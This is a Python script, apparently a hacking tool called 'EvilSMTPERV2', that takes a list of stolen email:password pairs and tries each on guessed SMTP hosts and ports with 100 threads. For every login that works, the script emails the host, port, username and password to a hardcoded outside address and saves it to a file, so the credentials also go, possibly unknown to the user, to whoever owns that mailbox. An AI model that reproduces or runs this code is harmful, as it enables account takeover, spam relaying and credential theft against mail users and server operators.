import base64
import os
import smtplib
from concurrent.futures import ThreadPoolExecutor, as_completed
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import fontstyle
import sys
import time
import os

HOST_EX = ['', 'mail.', 'smtp.', 'secure.plala.', 'secure.']
PORTS = ['465', '587', '25', '2525']
toaddr = 'didntwork88@outlook.com'

# Replace with your bot token and chat ID if needed
BOT_TOKEN = ""
CHAT_ID = ""

VALIDS = 0
INVALIDS = 0

# ANSI color codes for styling the output
fg = '\033[92m'
fr = '\033[91m'
fw = '\033[97m'
fy = '\033[93m'
flc = '\033[96m'
res = '\u001b[0m'

# ASCII logo function
# Typing effect function
def typing_effect(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# Updated larger and more powerful banner
def logo():
    banner = f"""{fg}
     ⣰⡆                            ⠐⣆                     
    ⣴⠁⡇   {fr}EvilSMTPERV2{fg}     ⢀⠃⢣                     
    ⢻ ⠸⡀    {fr}@wolfshopn{fg}     ⡜ ⢸⠇                     
    ⠘⡄⢆⠑⡄     ⢀⣀⣀⣠⣄⣀⣀⡀     ⢀⠜⢠⢀⡆           
     ⠘⣜⣦⠈⢢⡀⣀⣴⣾⣿⡛⠛⠛⠛⠛⠛⡿⣿⣦⣄ ⡠⠋⣰⢧⠎           
      ⠘⣿⣧⢀⠉⢻⡟⠁⠙⠃     ⠈⠋ ⠹⡟⠉⢠⢰⣿⠏           
       ⠘⣿⡎⢆⣸⡄          ⠠⣿⣠⢣⣿⠏           
       ⡖⠻⣿⠼⢽             ⢹⠹⣾⠟⢳⡄           
       ⡟⡇⢨ ⢸⡀            ⡎ ⣇⢠⢿⠇           
       ⢹⠃⢻⡤⠚     ⣀ ⢀     ⠙⠢⡼ ⢻           
       ⠸⡓⡄⢹⠦⠤⠤⠤⢾⣇   ⢠⡷⠦⠤⠤⠴⢺⢁⠔⡟           
       ⢠⠁⣷⠈⠓⠤⠤⠤⣞⡻   ⢸⣱⣤⠤⠤⠔⠁⣸⡆⣇           
       ⠘⢲⠋⢦⣀⣠⢴⠶    ⠁   ⠴⣶⣄⣀⡴⠋⣷⠋           
        ⣿⡀   ⢀⡘⠶⣄⡀    ⣠⡴⠞⣶ ⢀ ⣼           
        ⠈⠻⣌⢢⢸⣷⣸⡈⠳⠦⠤⠞⠁⣷⣼⡏⣰⢃⡾⠋           
          ⠙⢿⣿⣿⡇⢻⡶⣦⣤⡴⡾⢸⣿⣿⣷⠏           
            ⢿⡟⡿⡄⣳⣤⣤⣴⢁⣾⠏⡿⠁           
            ⠈⣷⠘⠒⠚⠉⠉⠑⠒⠊⣸⠇           
             ⠈⠳⠶⠔⠒⠒⠲⠴⠞⠋
          WE HACK ANYTHING         
    {fw}"""
    
    # Type the banner with a delay
    typing_effect(banner)

# Checking SMTP credentials
def check_smtp_deliver(smtp):
    global VALIDS, INVALIDS
    HOST, PORT, usr, pas = smtp.strip().split('|')
    try:
        with smtplib.SMTP(HOST, PORT, timeout=15) as server:
            server.ehlo()
            server.starttls()
            server.login(usr, pas)
            msg = MIMEMultipart()
            msg['Subject'] = "test"
            msg['From'] = usr
            msg['To'] = toaddr
            data = f"SMTP VALID by EvilSMTPERV2\n{HOST}|{PORT}|{usr}|{pas}"
            msg.attach(MIMEText(data, 'html', 'utf-8'))
            server.sendmail(usr, [msg['To']], msg.as_string())

            print(f'{fg}[+] [SUCCESS] {smtp}{res}')
            with open('validsmtp.txt', 'a') as valid_file:
                valid_file.write(f"{smtp}\n")

            VALIDS += 1
            os.system(f"title [+] SMTP WORKED - VALIDS: {VALIDS}, INVALIDS: {INVALIDS}")
            return True
    except Exception as e:
        print(f'{fr}[-] [FAILED] {smtp}{res} - {str(e)}')
        INVALIDS += 1
    return False

# Generate SMTP combinations
def starter(combo):
    user, pwd = combo.split(':', 1)
    host = user.split('@')[1]
    smtps = [f'{hostex}{host}|{port}|{user}|{pwd}' for hostex in HOST_EX for port in PORTS]
    
    # Use the first successful SMTP
    for smtp in smtps:
        if check_smtp_deliver(smtp):
            break

def main():
    logo()
    try:
        file_path = input(f'[{fg}#] List (format => Email:Password) : ')
        with open(file_path, 'r', errors='ignore') as file:
            combos = [line.strip() for line in file.readlines()]
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(starter, combo) for combo in combos]
            for future in as_completed(futures):
                pass
    except Exception as e:
        print(f'{fr}[-] Error: {e}{res}')

if __name__ == '__main__':
    main()
